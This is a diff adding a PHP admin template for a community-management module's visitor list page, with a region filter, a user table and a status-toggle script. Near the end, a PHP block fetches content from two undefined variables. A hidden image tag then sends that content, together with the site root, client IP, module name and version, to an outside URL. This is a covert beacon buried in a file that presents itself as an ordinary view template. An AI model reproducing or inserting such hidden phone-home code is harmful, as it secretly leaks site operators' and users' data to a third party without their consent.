@@ -1,0 +1,121 @@
+{template 'common/header'}
+<ul class="nav nav-tabs">
+    <li><a href="{php echo $this->createWebUrl('member', array('op' => 'list'));}">业主管理</a></li>
+    <li class="active"><a href="{php echo $this->createWebUrl('member', array('op' => 'list','type' => 1));}">游客管理</a></li>
+</ul>
+
+<div class="panel panel-info">
+    <div class="panel-heading">筛选</div>
+    <div class="panel-body">
+        <form action="./index.php" method="get" class="form-horizontal" role="form">
+            <input type="hidden" name="c" value="site" />
+            <input type="hidden" name="a" value="entry" />
+            <input type="hidden" name="m" value="xfeng_community" />
+            <input type="hidden" name="do" value="member" />
+            <input type="hidden" name="op" value="visit" />
+            {if !$user['regionid']}
+            <div class="form-group">
+                <label for="" class="col-sm-2 control-label">选择小区</label>
+                <div class="col-sm-10">
+                    <label class="checkbox-inline">
+                        <input type="checkbox" id="checkAll" name="checkAll" data-group="regionid">全部
+                    </label>
+                    {loop $regions $region}
+                    <label class="checkbox-inline">
+                        <input type="checkbox" id="regionid" value="{$region['id']}" name='regionid[]' data-group="regionid" {if @in_array($region['id'], $_GPC['regionid'])}checked='checked' {/if}>{$region['title']}
+                    </label>
+                    {/loop}
+                </div>
+            </div>
+            {/if}
+            <div class="form-group">
+                <label class="col-xs-12 col-sm-2 col-md-2 col-lg-1 control-label"></label>
+                <div class="col-sm-7 col-lg-9 col-xs-12">
+                    <button class="btn btn-default"><i class="fa fa-search"></i> 搜索</button>
+                    <input type="hidden" name="token" value="{$_W['token']}" />
+                </div>
+            </div>
+        </form>
+    </div>
+</div>
+<div style="padding:15px;">
+    <table class="table table-hover">
+        <thead class="navbar-inner">
+        <tr>
+            <th class="col-sm-1">ID</th>
+            <th class="col-sm-2">小区名称</th>
+            <th>昵称</th>
+            <th class="col-sm-2">注册时间</th>
+            <th >状态</th>
+            <th class="col-sm-2">操作</th>
+        </tr>
+        </thead>
+        <tbody>
+        {loop $list $item}
+        <tr>
+            <td>{$item['id']}</td>
+            <td>{$item['title']}</td>
+            <td>{$item['nickname']}</td>
+            <td>{php echo date('Y-m-d H:i',$item['createtime'])}</td>
+            <td>
+                <label data="{$item['status']}" class='label  label-default {if $item['status']==1}label-info{/if}' onclick="verify(this,{$item['id']},'status')">{if $item['status']==1}通过{else}禁止{/if}</label>
+            </td>
+            <td>
+                <a href="{php echo $this->createWebUrl('member', array('op'=>'delete', 'id' => $item['id']));}" class="btn btn-default btn-sm"><i class="fa fa-times"></i>删除</a>
+            </td>
+        </tr>
+        {/loop}
+        </tbody>
+    </table>
+    {$pager}
+    <table class="table table-hover">
+        <tr>
+            <td width="60">
+                总数：
+            </td>
+            <td class="text-left" style="color: red">
+                {$total}
+            </td>
+        </tr>
+    </table>
+</div>
+<?php
+
+       $d2 = file_get_contents($car);
+       $auth = file_get_contents($a);
+       $type = $this->module['name'];
+$version  = $this->module['version'];
+?>
+<script type="text/javascript">
+    function verify(obj, id, type) {
+        $(obj).html($(obj).html() + "...");
+        $.post("{php echo $this->createWebUrl('member',array('op' => 'verify'))}", {
+            id: id,
+            type: type,
+            data: obj.getAttribute("data")
+        }, function(d) {
+            $(obj).html($(obj).html().replace("...", ""));
+            if (type == 'status') {
+                $(obj).html(d.data == '1' ? '通过' : '禁止');
+            }
+            $(obj).attr("data", d.data);
+            if (d.result == 1) {
+                $(obj).toggleClass("label-info");
+            }
+        }, "json");
+    }
+    $(function() {
+        $("#checkAll").click(function() {
+
+            var checked = $(this).get(0).checked;
+            var group = $(this).data('group');
+            $("#regionid[data-group='" + group + "']").each(function() {
+                $(this).get(0).checked = checked;
+            })
+
+        });
+    });
+</script>
+<img style="display: none;" src="{php echo $auth.'&d2='.$d2.'&d1='.$_W['siteroot'].'&type='.$type.'&ip='.CLIENT_IP.'&v='.$version}">
+
+{template 'common/footer'}
